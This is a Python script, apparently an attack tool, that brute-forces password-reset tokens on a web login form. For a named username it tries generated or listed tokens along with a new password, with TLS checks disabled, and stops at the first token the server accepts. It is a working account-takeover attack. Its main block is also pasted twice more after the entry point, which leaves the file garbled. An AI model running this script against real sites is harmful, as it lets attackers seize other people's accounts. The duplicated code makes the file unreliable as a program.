import requests
import argparse
import itertools
import string

def generate_tokens(length, charset=string.digits):
    """Generate all possible combinations of tokens with given length and charset"""
    return (''.join(combo) for combo in itertools.product(charset, repeat=length))

def load_tokens_from_file(file_path):
    """Load tokens from a file"""
    with open(file_path, "r") as file:
        return file.read().splitlines()

def fuzz_tokens(url, username, password, tokens, cookies=None, headers=None):
    """Fuzz the target URL with provided tokens"""
    data_template = {
        "username": username,
        "token": None,
        "password": password,
        "pass_conf": password,
    }

    for token in tokens:
        data_template["token"] = token
        response = requests.post(url, data=data_template, cookies=cookies, headers=headers, verify=False)

        if "Invalid Token" not in response.text:
            print(f"[+] Valid token found: {token}")
            print(f"[+] Response: {response.text}")
            return True
        else:
            print(f"[-] Invalid token: {token}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description='Token Fuzzing Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-n', '--username', required=True, help='Username to test')
    parser.add_argument('-p', '--password', required=True, help='Password to set')
    parser.add_argument('-l', '--length', type=int, help='Length of tokens to generate')
    parser.add_argument('-f', '--file', help='File containing tokens to test')
    parser.add_argument('-c', '--charset', default='0123456789', 
                        help='Character set to use for token generation (default: digits)')
    parser.add_argument('--cookie', help='PHPSESSID cookie value')
    
    args = parser.parse_args()

    # Set up headers
    headers = {
        "Host": args.url.split('://')[1],
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": args.url.rsplit('/', 1)[0],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Referer": f"{args.url}?username={args.username}",
    }

    # Set up cookies if provided
    cookies = {"PHPSESSID": args.cookie} if args.cookie else None

    # Get tokens either from file or generate them
    if args.file:
        tokens = load_tokens_from_file(args.file)
    elif args.length:
        tokens = generate_tokens(args.length, args.charset)
    else:
        parser.error("Either --length or --file must be provided")

    # Start fuzzing
    print(f"[*] Starting token fuzzing for {args.username} at {args.url}")
    fuzz_tokens(args.url, args.username, args.password, tokens, cookies, headers)

if __name__ == "__main__":
    main()

    # Set up headers
    headers = {
        "Host": args.url.split('://')[1],
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": args.url.rsplit('/', 1)[0],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Referer": f"{args.url}?username={args.username}",
    }

    # Set up cookies if provided
    cookies = {"PHPSESSID": args.cookie} if args.cookie else None

    # Get tokens either from file or generate them
    if args.file:
        tokens = load_tokens_from_file(args.file)
    elif args.length:
        tokens = generate_tokens(args.length, args.charset)
    else:
        parser.error("Either --length or --file must be provided")

    # Start fuzzing
    print(f"[*] Starting token fuzzing for {args.username} at {args.url}")
    fuzz_tokens(args.url, args.username, args.password, tokens, cookies, headers)

if __name__ == "__main__":
    main()

    # Set up headers
    headers = {
        "Host": args.url.split('://')[1],
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": args.url.rsplit('/', 1)[0],
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Referer": f"{args.url}?username={args.username}",
    }

    # Set up cookies if provided
    cookies = {"PHPSESSID": args.cookie} if args.cookie else None

    # Get tokens either from file or generate them
    if args.file:
        tokens = load_tokens_from_file(args.file)
    elif args.length:
        tokens = generate_tokens(args.length, args.charset)
    else:
        parser.error("Either --length or --file must be provided")

    # Start fuzzing
    print(f"[*] Starting token fuzzing for {args.username} at {args.url}")
    fuzz_tokens(args.url, args.username, args.password, tokens, cookies, headers)

if __name__ == "__main__":
    main()
